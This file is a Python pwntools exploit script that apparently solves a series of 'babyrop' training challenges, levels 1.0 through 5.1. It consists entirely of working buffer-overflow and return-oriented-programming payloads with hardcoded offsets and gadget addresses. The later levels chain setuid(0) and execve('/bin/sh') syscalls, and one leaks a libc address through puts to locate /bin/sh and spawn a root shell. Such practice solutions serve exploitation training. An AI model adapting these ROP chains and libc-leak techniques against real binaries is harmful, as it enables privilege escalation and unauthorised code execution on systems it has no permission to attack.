#!/usr/bin/python

from pwn import *


def baby1_0(p):
    win_addr = 0x00401fca

    #data = cyclic(200) Find crash index cyclic_find(0x6261616f6261616e) = 152
    data = b'A'*152 + p64(win_addr)

    p.recvuntil(b'address).')
    p.sendline(data)

def baby1_1(p):
    win_addr = 0x4017c7

    #data = cyclic(200) # Find crash index cyclic_find(0x6161616c6161616b) = 40
    data = b'A'*40 + p64(win_addr)

    p.recvuntil(b'###')
    p.sendline(data)

def baby2_0(p):
    ''''''
    win1 = 0x401bc8
    win2 = 0x401c75

    #data = cyclic(200) # Find crash index cyclic_find(0x6261616762616166) = 120
    data = b'A'*120 + p64(win1) + p64(win2)

    p.recvuntil(b'address).')
    p.sendline(data)

def baby2_1(p):
    ''''''
    win1 = 0x40126d
    win2 = 0x40131a

    #data = cyclic(200) # Find crash index cyclic_find(0x6261616762616166) = 120
    data = b'A'*120 + p64(win1) + p64(win2)

    p.recvuntil(b'###')
    p.sendline(data)

def baby3_0(p):
    ''''''
    win1 = 0x4023d9
    win2 = 0x402760
    win3 = 0x402598
    win4 = 0x40267a
    win5 = 0x4024b5

    pop_rdi = 0x402b53

    data = b'A'*104 + \
           p64(pop_rdi) + p64(1) + p64(win1) + \
           p64(pop_rdi) + p64(2) + p64(win2) + \
           p64(pop_rdi) + p64(3) + p64(win3) + \
           p64(pop_rdi) + p64(4) + p64(win4) + \
           p64(pop_rdi) + p64(5) + p64(win5)

    p.recvuntil(b'address).')
    p.sendline(data)

def baby3_1(p):
    ''''''
    win1 = 0x40203d
    win2 = 0x401cb2
    win3 = 0x401e78
    win4 = 0x401d92
    win5 = 0x401f5a

    pop_rdi = 0x402273
    data = b'A'*56 + \
           p64(pop_rdi) + p64(1) + p64(win1) + \
           p64(pop_rdi) + p64(2) + p64(win2) + \
           p64(pop_rdi) + p64(3) + p64(win3) + \
           p64(pop_rdi) + p64(4) + p64(win4) + \
           p64(pop_rdi) + p64(5) + p64(win5)

    p.recvuntil(b'###')
    p.sendline(data)

def baby4_0(p):
    ''''''
    execve = 0x3b
    setuid = 0x69
    syscall = 0x401fb5
    pop_rdi = 0x401fd5
    pop_rax = 0x401fad
    pop_rsi = 0x401fcd
    pop_rdx = 0x401fa5

    
    p.recvuntil(b'[LEAK]')
    leak = int(p.recvline().split(b':')[1].strip()[:-1], 16)

    # set uid to root then run shell
    data = b'/bin/sh\0' + b'A'*80 + \
           p64(pop_rax) + p64(setuid) + \
           p64(pop_rdi) + p64(0) + \
           p64(syscall) + \
           p64(pop_rax) + p64(execve) + \
           p64(pop_rdi) + p64(leak) + \
           p64(pop_rsi) + p64(0) + \
           p64(pop_rdx) + p64(0) + \
           p64(syscall)


    p.sendline(data)

def baby4_1(p):
    ''''''
    execve = 0x3b
    setuid = 0x69
    syscall = 0x401690
    pop_rdi = 0x401688
    pop_rax = 0x401699
    pop_rsi = 0x4016a0
    pop_rdx = 0x4016b1

    p.recvuntil(b'[LEAK]')
    leak = int(p.recvline().split(b':')[1].strip()[:-1], 16)

    data = b'/bin/sh\0' + b'A'*48 + \
           p64(pop_rax) + p64(setuid) + \
           p64(pop_rdi) + p64(0) + \
           p64(syscall) + \
           p64(pop_rax) + p64(execve) + \
           p64(pop_rdi) + p64(leak) + \
           p64(pop_rsi) + p64(0) + \
           p64(pop_rdx) + p64(0) + \
           p64(syscall)

    p.sendline(data)

def baby5_0(p):
    ''''''
    challenge = 0x40185c
    pop_rax = 0x40181e
    pop_rdi = 0x401855
    pop_rsi = 0x40183d
    pop_rdx = 0x401845
    syscall = 0x40182d
    execve = 0x3b
    setuid = 0x69
    call_rax = 0x401014 #call rax; add rsp,8

    p.recvuntil(b'Programming!')

    # call challenge again so we can write more data after leak happens
    data = b'A'*136 + p64(pop_rax) + p64(challenge) + p64(call_rax) + \
           b'B'*100 + b'/bin/sh\0'
    p.sendline(data)

    # get leak
    p.recvuntil(b'ROP chain at ')
    leak = int(p.recvline().strip()[:-1], 16)
    print('leak', hex(leak))

    data = b'A'*136 +\
           p64(pop_rax) + p64(setuid) + \
           p64(pop_rdi) + p64(0) + \
           p64(syscall) + \
           p64(pop_rdi) + p64(leak+128) + \
           p64(pop_rsi) + p64(0) +\
           p64(pop_rdx) + p64(0) +\
           p64(pop_rax) + p64(execve)+\
           p64(syscall) + \
           b'/bin/sh\0'

    p.sendline(data)

def baby5_1(p):
    ''''''
    pop_rax = 0x401c5a
    pop_rdi = 0x401c4a
    puts_got = 0x404020
    puts_plt = 0x401094
    execve = 0x3b
    pop_rdx = 0x401c63
    setuid = 0x69
    challenge = 0x00401c89
    syscall = 0x401c7a
    alt_rax = 0x36174

    p.recvuntil(b'###')

    #leak chain (use puts to leak puts)
    data = b'A'*88 + \
           p64(pop_rdi) + p64(puts_got) + \
           p64(puts_plt) + p64(challenge)
    p.sendline(data)

    p.recvuntil(b'Leaving!')
    p.recvline()
    leak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
    print('leak: ', hex(leak))
    libc = leak - 0x84420
    print('libc: ', hex(libc))
    bin_sh = libc + 0x1b45bd 
    print('bin/sh: ', hex(bin_sh))
    pop_rsi = libc + 0x2601f

    #code execution
    data = b'A'*88 +\
           p64(pop_rax) + p64(setuid) + \
           p64(pop_rdi) + p64(0) + \
           p64(syscall) + \
           p64(pop_rdi) + p64(bin_sh) + \
           p64(pop_rsi) + p64(0) +\
           p64(pop_rdx) + p64(0) +\
           p64(pop_rax) + p64(execve)+\
           p64(syscall)
    
    p.sendline(data)


#p = process('/challenge/babyrop_level5.1')
#p = process('./babyrop_level5.1')
p = gdb.debug('./babyrop_level5.1','''
b challenge
c            
''')


baby5_1(p)
p.interactive()